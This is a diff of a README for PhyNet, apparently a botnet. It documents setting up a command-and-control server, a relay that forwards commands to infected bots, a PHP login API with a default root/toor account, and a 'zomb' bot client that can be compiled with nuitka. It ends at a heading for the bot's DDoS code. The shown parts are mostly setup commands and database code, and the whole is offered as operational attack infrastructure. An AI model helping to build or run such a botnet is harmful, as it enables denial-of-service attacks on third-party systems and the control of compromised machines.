@@ -9,14 +9,23 @@ My cnc works with a relay (which will relay the commands to the bots to avoid an
 
 for setup the [cnc](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/cnc.py):  
 ```batch
-py cnc.py 8080    
+python3 cnc.py <port>
 ```
+or just `make cnc` with the makefile
+
+The cnc password is stored in the sql database, the cnc uses the page [login.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/login.php) for login, like this we doesn't have to keep a raw text file with the password in it, moreover the password is a combo of sha512(sha256(password)) and is inserted with the following sql command: 
+```sql
+INSERT INTO `users` (`id`, `username`, `password`) VALUES
+(1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
+```
+here the default username is **root** and the default password is **toor**
 
 # RELAY
 for setup the [relay](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/relay.py):  
 ```batch
-py relay.py 5000
+python3 relay.py <port>
 ```
+or just `make relay` with the makefile
 
 # API
 for setup the [api](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2), you need a database:
@@ -48,45 +57,37 @@ CREATE TABLE IF NOT EXISTS `users` (
 ) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8_unicode_ci;
 
 INSERT INTO `users` (`id`, `username`, `password`) VALUES
-(1, 'root', '2b64f2e3f9fee1942af9ff60d40aa5a719db33b8ba8dd4864bb4f11e25ca2bee00907de32a59429602336cac832c8f2eeff5177cc14c864dd116c8bf6ca5d9a9');
+(1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
 COMMIT;
 ```
 (the password encryption is sha512)   
 In php you can use this function for generate a password
 ```php
-function create_acc($usr, $pass) {
+function createAccount(string $usr, string $password): bool {
+    global $conn; // ensure to have the db conn
 
-    global $conn;
+    // the final password is sha512(sha256(password))
+    $password = hash('sha256', $password);
+    $password = hash('sha512', $password);
 
-    $pass=hash('sha256', $pass);
-    $pass=hash('sha512', $pass);
-    
-    $sql="INSERT INTO users (username, password) VALUES ('$usr', '$pass')";
-    $result=mysqli_query($conn, $sql);
+    // insert the new user in the database
+    $stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
+    $stmt->bind_param("ss", $usr, $password);
+    $result = $stmt->execute();
 
-    if ($result==TRUE) {
-
-        echo json_encode("ok", JSON_PRETTY_PRINT);
-
-    } else {
-
-        echo json_encode("error", JSON_PRETTY_PRINT);
-
-    }
-
+    return $result;
 }
 ```
 Next, you need an php server for copy the api file ([SERVER/api/v1](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2))  
 After you have to configure the database in the php script ([SERVER/api/v1/db_conn/db_connn.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/db/db_conn.php))  
 ```php
-$sname="localhost"; //database address
-$unmae="root"; //database username
-$password=""; //database password
-$db_name="phybot"; //database name
-$conn=mysqli_connect($sname, $unmae, $password, $db_name);
+$sname = "localhost";
+$unmae = "root";
+$password = "";
+$db_name = "phybot";
+$conn = mysqli_connect($sname, $unmae, $password, $db_name);
 
 if (!$conn) {
-    
 	echo json_encode("db_connection_failed", JSON_PRETTY_PRINT);
 }
 ```
@@ -99,8 +100,10 @@ You have to change your api url in:
 you may want to compile the bot with nuitka (create a fast executable file because the python code is transpiled to c and compiled)
 but the simple command for running it is:
 ```batch
-py zomb.py
+python3 zomb.py
 ```
+and you can just build it with the command `make build-bot`
+
 ## ZOMB DDOS Code: 
 ```python
 def dos(
